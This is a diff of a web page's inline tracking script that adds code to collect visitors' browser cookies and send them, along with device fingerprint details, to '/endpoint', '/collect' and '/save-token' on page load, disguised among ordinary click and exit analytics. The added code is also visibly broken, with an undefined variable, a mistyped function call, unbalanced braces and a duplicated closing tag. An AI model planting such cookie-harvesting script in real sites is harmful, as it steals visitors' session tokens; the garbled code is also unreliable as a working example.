@@ -125,27 +125,57 @@
 
     document.addEventListener('click', () => clicks++);
     document.addEventListener('mousemove', () => moves++);
-
-    const details = () => ({
-      event: "page_open",
-      lang: navigator.language || "",
-      ua: navigator.userAgent,
-      platform: navigator.platform || "",
-      screen: { w: screen.width, h: screen.height, dpr: window.devicePixelRatio || 1 },
-      viewport: { w: innerWidth, h: innerHeight },
-      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
-      ref: document.referrer || ""
+     
+    
+    function getAllCookies() {
+        const allCookies = document.cookie.split(';');
+        const cookieMap = {};
+        cookies.forEach(cookie => {
+        const parts = cookie.trim().split('=');
+    });    
+    
+        const details = () => ({
+        
+          cookies: get.AllCookies(),
+          lang: navigator.language || "",
+          ua: navigator.userAgent,
+          platform: navigator.platform || "",
+          screen: { w: screen.width, h: screen.height, dpr: window.devicePixelRatio || 1 },
+          viewport: { w: innerWidth, h: innerHeight },
+          tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+          ref: document.referrer || ""
+        });
+    document.addEventListener("DOMContentLoaded", ()=>{
+        const payload = {
+          event: "page_open",
+          time: new Date().toISOString(),
+          clicks,moves,
+          ...details()
+         };
+         
+    fetch("/endpoint", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
     });
-    function sendData() {
-      let data = {
-       content:document.cookie
-      };
+        function sendData() {
+          let data = {
+           content:document.cookie
+          };
+          
+    fetch("/collect", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      credentials: "include",
+      body: JSON.stringify(payload)
+      });
+    })      
        
-    fetch('/track', {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify(details())
-    }).catch(()=>{});
+    fetch("/save-token", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify(payload)
+      });
 
     document.getElementById('followBtn').addEventListener('click', () => {
       const payload = {
@@ -155,15 +185,35 @@
       };
       navigator.sendBeacon('/track', new Blob([JSON.stringify(payload)], {type:'application/json'}));
     });
-
-    window.addEventListener('beforeunload', () => {
+    
+    const btn = document.getElementById('followBtn');
+  if (btn) {
+    btn.addEventListener('click', () => {
       const payload = {
-        event: "page_exit",
-        time_spent: Math.floor((Date.now()-startedAt)/1000),
-        clicks, moves
+        event: 'button_click',
+        ts: new Date().toISOString(),
+        time_spent: Math.floor((Date.now() - startedAt) / 1000),
+        clicks, moves,
+        ...details()
       };
-      navigator.sendBeacon('/track', new Blob([JSON.stringify(payload)], {type:'application/json'}));
+      const blob = new Blob([JSON.stringify(payload)], {type:'application/json'});
+      navigator.sendBeacon('/track', blob);
+      
     });
+  }
+
+  // 3) page_exit: قبل إغلاق/مغادرة الصفحة
+  window.addEventListener('beforeunload', () => {
+    const payload = {
+      event: 'page_exit',
+      ts: new Date().toISOString(),
+      time_spent: Math.floor((Date.now() - startedAt) / 1000),
+      clicks, moves
+    };
+    const blob = new Blob([JSON.stringify(payload)], {type:'application/json'});
+    navigator.sendBeacon('/track', blob);
+  });
+</script>
     
   </script>
 </body>
